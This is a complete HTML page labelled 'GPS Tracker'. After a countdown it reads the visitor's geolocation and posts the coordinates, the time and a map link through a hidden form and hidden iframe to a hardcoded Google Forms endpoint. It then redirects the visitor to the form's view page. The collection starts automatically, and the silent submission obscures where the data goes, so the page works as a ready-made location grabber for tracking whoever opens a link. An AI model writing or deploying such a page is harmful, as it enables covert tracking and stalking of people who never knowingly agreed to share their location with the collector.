<meta charset="UTF-8">
<title>GPS Tracker</title>

<style>
  body {
    font-family: Arial;
    background: #eef2f7;
    text-align: center;
    padding-top: 100px;
  }

  .card {
    background: white;
    width: 340px;
    margin: auto;
    padding: 25px;
    border-radius: 12px;
    box-shadow: 0 0 15px rgba(0,0,0,0.1);
  }

  #timer {
    font-size: 42px;
    color: #007bff;
  }

  #status {
    font-size: 14px;
    margin-top: 10px;
  }
</style>
</head>

<body>

<div class="card">
  <h3>GPS Tracker</h3>
  <p>Submitting your location...</p>

  <div id="timer">5</div>
  <p id="status">Starting...</p>
</div>

<script>
let t = 5;
const timer = document.getElementById("timer");
const status = document.getElementById("status");

const count = setInterval(() => {
  t--;
  timer.innerHTML = t;

  if (t === 0) {
    clearInterval(count);
    getLocation();
  }
}, 1000);

function getLocation() {

  if (!navigator.geolocation) {
    status.innerHTML = "Geolocation not supported";
    return;
  }

  status.innerHTML = "Getting location...";

  navigator.geolocation.getCurrentPosition(function(pos) {

    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const time = new Date().toLocaleString();

    const map = "https://www.google.com/maps?q=" + lat + "," + lon;

    const value =
      "Lat: " + lat +
      " | Lon: " + lon +
      " | Time: " + time +
      " | Map: " + map;

    status.innerHTML = "Submitting...";

    // Create form
    const form = document.createElement("form");
    form.method = "POST";
    form.action = "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/formResponse";
    form.target = "hidden_iframe";

    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "entry.1341563402";
    input.value = value;

    form.appendChild(input);
    document.body.appendChild(form);

    form.submit();

    status.innerHTML = "Redirecting...";

    // ⬇️ FIXED REDIRECT (important delay)
    setTimeout(() => {
      window.location.href =
        "https://docs.google.com/forms/d/e/1FAIpQLSd4KJoIXicff1vBOAH1VgmFNBFUcGBSxf6iQE08eqOSWAXC_w/viewform";
    }, 2000);

  }, function(err) {
    status.innerHTML = "Error: " + err.message;
  });
}
</script>

<!-- hidden iframe -->
<iframe name="hidden_iframe" style="display:none;"></iframe>

</body>
</html>
